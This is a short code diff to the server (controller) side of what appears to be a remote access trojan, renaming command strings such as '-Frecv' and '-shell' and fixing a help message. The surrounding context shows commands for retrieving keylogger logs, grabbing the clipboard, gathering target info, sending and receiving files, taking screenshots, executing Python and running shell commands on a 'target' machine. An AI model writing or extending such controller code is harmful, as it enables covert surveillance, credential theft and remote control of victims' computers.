@@ -51,8 +51,8 @@ class Server:
             #"-KLend": self.stopKeyLogger,
             "-getLogs": self.getKeyLogs,
             "-getcb": self.getClipBoard,
-            "-Send": self.filesend,
-            "-recv": self.filereceive,
+            "-Fsend": self.filesend,
+            "-Frecv": self.filereceive,
             "-ginfo": self.getTargetInfo,
             "-exe": self.exePy,
             "-ss": self.screenshot,
@@ -398,7 +398,7 @@ class Server:
             print(response.decode("utf-8"))
 
     def filereceive(self):
-        command = "-Frec"
+        command = "-Frecv"
         self.client_socket.send(command.encode())
 
         while True:
@@ -545,7 +545,7 @@ class Server:
         """ This is not a real interactive shell, you get the output
         of the command but you can't interact with it """
 
-        print("[!] --back to exit shell")
+        print("[!] -back to exit shell")
         while True:
             cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters
 
@@ -558,7 +558,7 @@ class Server:
                 break
 
             time.sleep(2)
-            command = "shell"
+            command = "-shell"
             self.client_socket.send(command.encode("utf-8"))
             self.client_socket.send(cmd.encode("utf-8"))
 
